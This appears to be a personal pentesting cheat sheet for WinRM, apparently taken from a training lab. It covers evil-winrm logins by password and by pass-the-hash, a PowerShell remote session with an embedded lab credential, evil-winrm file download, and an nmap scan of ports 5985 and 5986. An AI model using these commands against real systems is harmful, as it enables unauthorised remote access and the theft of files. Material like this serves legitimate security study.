## delete


# Interacting
## Connecting
```bash
# ClearPassword
$ evil-winrm -i <IP> -u <USER> -p <PASSWORD>

# PTH
$ evil-winrm -i <ip> -u <user> -H <hash>
```

## Session from Windows
```powershell
$password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force
$cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)
Enter-PSSession -ComputerName ACADEMY-EA-DB01 -Credential $cred
```

## Download
```
PS > download <file>
```

# Footprinting 
## Nmap WinRM
```bash
$ nmap -sV -sC 10.129.201.248 -p5985,5986 --disable-arp-ping -n
```

